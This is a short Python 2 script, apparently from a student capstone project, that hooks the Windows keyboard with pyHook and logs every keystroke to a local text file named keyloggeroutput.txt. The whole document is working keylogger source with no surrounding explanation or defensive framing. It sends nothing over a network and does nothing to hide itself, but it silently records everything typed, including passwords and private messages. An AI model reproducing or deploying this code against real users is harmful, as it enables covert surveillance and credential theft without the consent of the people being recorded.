import pyHook, pythoncom, sys, logging
file_log = 'C:\Users\Tom\Documents\College Work\CapstoneStuff\keyloggeroutput.txt'
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    if chr(event.Ascii) in "ABCDEFGHIJKLMNOPQRSTUVWXYZ": print chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
